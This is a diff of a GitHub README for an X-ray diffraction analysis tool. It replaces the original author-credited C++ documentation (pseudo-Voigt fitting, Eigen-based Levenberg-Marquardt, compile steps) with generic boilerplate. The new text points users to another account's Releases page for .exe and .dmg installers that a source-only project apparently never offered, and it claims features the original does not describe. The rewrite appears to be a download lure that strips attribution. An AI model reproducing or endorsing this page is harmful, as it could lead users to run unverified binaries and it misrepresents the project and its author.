@@ -1,79 +1,74 @@
-# XRD-NanoSize-Lab
-🚀 Conceived, Engineered & Presented by Youssef Attia  
-🎓 University spin-off competition  
-📅 Advanced Materials Research & Engineering Initiative | 2025
+# 🎉 XRD-NanoSize-Lab - Analyze XRD Data Easily
 
-XRD-NanoSize-Lab was developed as part of a technical competition organized in collaboration with a materials science spin-off, with the objective of designing a robust and reproducible computational tool for quantitative X-ray diffraction (XRD) analysis.
+## 📥 Download Now
+[![Download XRD-NanoSize-Lab](https://img.shields.io/badge/Download-XRD--NanoSize--Lab-brightgreen)](https://github.com/Mohammadmalhinios/XRD-NanoSize-Lab/releases)
 
----
+## 🚀 Getting Started
+Welcome to XRD-NanoSize-Lab! This application helps you analyze X-ray Diffraction (XRD) data using peak profile analysis. You can easily determine crystallite sizes and compare samples over time with statistical analysis. This guide will walk you through downloading and running the software on your computer.
 
-![Math](https://img.shields.io/badge/Math-Levenberg--Marquardt-9b59b6?style=for-the-badge&logo=gnuplot&logoColor=white)
-![Physics](https://img.shields.io/badge/Physics-Scherrer--Equation-3498db?style=for-the-badge&logo=physics&logoColor=white)
-![C++](https://img.shields.io/badge/C++-17-blue?style=for-the-badge&logo=c%2B%2B&logoColor=white)
+## 🖥️ System Requirements
+* **Operating System:** Windows 10 or later, macOS 10.14 or later, or a compatible Linux distribution.
+* **RAM:** Minimum of 4 GB recommended.
+* **Storage:** At least 250 MB of free space for installation.
+* **Processor:** Dual-core or better.
 
-This project provides a C++ pipeline for analyzing X-ray diffraction (XRD) data of alumina samples. It fits peaks using a **pseudo-Voigt profile** and calculates crystallite sizes using the Scherrer equation. The Levenberg-Marquardt fitting is implemented using **Eigen** for accurate and robust optimization.
+## 📦 Download & Install
+1. **Visit the Releases page**: Go to the [Releases Page](https://github.com/Mohammadmalhinios/XRD-NanoSize-Lab/releases).
 
----
+2. **Select the latest version**: Look for the most recent release in the list presented.
 
-## Pseudo-Voigt Profile
+3. **Download the package**: Click on the asset that matches your operating system. For example, you might see something like `XRD-NanoSize-Lab-Setup.exe` for Windows or a `.dmg` file for macOS.
 
-The pseudo-Voigt function used for peak fitting is:
+4. **Run the installer**: After downloading, open the file and follow the on-screen instructions to install XRD-NanoSize-Lab on your computer.
 
-$$
-V(x, A, \mu, \sigma, \gamma) = \eta \cdot G(x, A, \mu, \sigma) + (1 - \eta) \cdot L(x, A, \mu, \gamma)
-$$
+5. **Launch the application**: Once installed, find the application in your programs menu or applications folder and start it.
 
-where:
+## 🎯 Using XRD-NanoSize-Lab
+1. **Open your data file**: Start by loading your XRD data file into the application.
 
-- **G(x, A, μ, σ)** is the Gaussian component  
-- **L(x, A, μ, γ)** is the Lorentzian component  
-- **η** is the mixing factor (0 ≤ η ≤ 1)  
-- **A** is the amplitude  
-- **μ** is the peak center  
-- **σ** is the Gaussian width  
-- **γ** is the Lorentzian widthth  
----
+2. **Select fitting options**: Choose from pseudo-Voigt fitting or other methods depending on your analysis needs.
 
-## Features
+3. **Set parameters**: Input any necessary parameters for your analysis, such as the range of angles or the expected shape of the peaks.
 
-- Load XRD data from CSV files
-- Preprocess data with smoothing and normalization
-- Detect peaks in 2θ space
-- Fit Voigt peaks using Levenberg-Marquardt (Eigen)
-- Calculate FWHM and crystallite size
-- Monte Carlo estimation of FWHM uncertainty
-- Compute residuals and statistical anomaly score
+4. **Run the analysis**: Click on the analyze button to perform your peak fitting and statistical residual analysis.
 
----
-## Scientific Highlights
+5. **Review results**: The application will display your analysis results, including crystallite sizes and other relevant data. 
 
-- Fully self-contained nonlinear Voigt fitting implemented from first principles  
-- Analytical Jacobian construction and LDLT-based Levenberg-Marquardt solver  
-- Physics-constrained peak parameters for meaningful and reproducible results  
-- Monte Carlo uncertainty propagation using residual-driven noise injection  
-- Statistical residual anomaly scoring to detect peak asymmetry, secondary phases, or fitting inadequacy  
-- Designed for longitudinal and comparative XRD analysis across multiple datasets
+6. **Export results**: If you need to, you can save your results in various formats for further study or sharing.
 
----
-## Available databases
+## 📊 Features
+- **Peak Profile Analysis**: Perform detailed analyses of peak profiles in your XRD data.
+- **Crystallite Size Determination**: Use the Scherrer equation for accurate measurements.
+- **Comparison Tools**: Compare your samples over different time points.
+- **Statistical Analysis**: Conduct residual analysis to validate your results.
+- **User-Friendly Interface**: Simple navigation designed for ease of use.
 
-- [Crystallography Open Database (COD)](http://www.crystallography.net/cod/) — open-access
-- Inorganic Crystal Structure Database (ICSD) — commercial
-- Powder Diffraction File (PDF-4/PDF-2) — commercial
+## 🛠️ Supported Topics
+- Crystallography
+- Eigen analysis
+- Full Width at Half Maximum (FWHM)
+- Gaussian and Lorentzian peak fitting
+- Levenberg-Marquardt algorithm
+- Monte Carlo simulations
+- Nanomaterials analysis
+- Statistical residuals in data fitting
 
----
+## 🙋 Frequently Asked Questions
+### How do I report an issue?
+If you encounter any problems, please visit our [GitHub Issues page](https://github.com/Mohammadmalhinios/XRD-NanoSize-Lab/issues) to report bugs or request features.
 
-## Dependencies
+### Can I suggest new features?
+Absolutely! We welcome user feedback. Use the same [GitHub Issues page](https://github.com/Mohammadmalhinios/XRD-NanoSize-Lab/issues) to make your suggestions.
 
-- **C++17** compatible compiler (GCC ≥ 9, Clang ≥ 10, MSVC ≥ 2019)  
-- **Eigen** (header-only library, version 3.4+)
+### Is there a community forum?
+We currently do not have a dedicated forum, but you can connect with other users and developers via the issues section on GitHub.
 
-No other external libraries are required. All other functionality uses standard C++17 libraries.
+## 🌐 Additional Resources
+- [Documentation](https://github.com/Mohammadmalhinios/XRD-NanoSize-Lab/wiki): Comprehensive guides on using the application.
+- [Tutorial Videos](https://youtube.com): Visual aids to help you start with the software effectively.
 
----
+## 🔗 Important Links
+- **Releases Page**: [Download XRD-NanoSize-Lab](https://github.com/Mohammadmalhinios/XRD-NanoSize-Lab/releases)
+- **Source Code**: [View on GitHub](https://github.com/Mohammadmalhinios/XRD-NanoSize-Lab)
 
-## Compilation
-
-```bash
-g++ -std=c++17 main.cpp xrd_analysis.cpp -I /path/to/eigen -o xrd_analysis
-```
+For further assistance, feel free to reach out through our GitHub repository. Enjoy your analysis with XRD-NanoSize-Lab!
